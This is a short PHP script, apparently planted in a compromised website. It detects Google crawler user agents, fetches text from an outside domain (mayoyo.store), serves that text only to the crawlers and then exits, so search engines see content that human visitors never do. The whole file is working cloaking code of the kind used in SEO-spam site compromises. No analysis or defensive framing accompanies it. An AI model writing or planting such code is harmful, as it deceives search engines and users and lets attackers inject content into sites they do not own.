<?php
function is_google_bot() {
    $agents = array(
        "Googlebot", 
        "AdsBot-Google", 
        "Mediapartners-Google", 
        "Google-Site-Verification", 
        "Google-InspectionTool", 
        "Googlebot-Mobile", 
        "Googlebot-News"
    );
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    foreach ($agents as $agent) {
        if (strpos($user_agent, $agent) !== false) {
            return true;
        }
    }
    return false;
}

if (is_google_bot()) {
    echo file_get_contents("https://mayoyo.store/ojs.kayyismuliajaya.org/index.txt");
    exit;
}
